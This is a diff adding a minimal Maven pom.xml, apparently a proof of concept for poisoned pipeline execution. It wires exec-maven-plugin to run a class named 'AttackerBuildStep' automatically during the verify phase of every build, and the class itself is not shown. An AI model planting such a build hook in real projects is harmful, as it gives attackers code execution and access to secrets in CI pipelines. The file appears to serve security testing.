@@ -1,0 +1,8 @@
+<project xmlns="http://maven.apache.org/POM/4.0.0"><modelVersion>4.0.0</modelVersion>
+  <groupId>poc</groupId><artifactId>ppe</artifactId><version>1.0</version>
+  <build><plugins><plugin>
+    <groupId>org.codehaus.mojo</groupId><artifactId>exec-maven-plugin</artifactId><version>3.1.0</version>
+    <executions><execution><id>ppe</id><phase>verify</phase><goals><goal>java</goal></goals></execution></executions>
+    <configuration><mainClass>AttackerBuildStep</mainClass></configuration>
+  </plugin></plugins></build>
+</project>
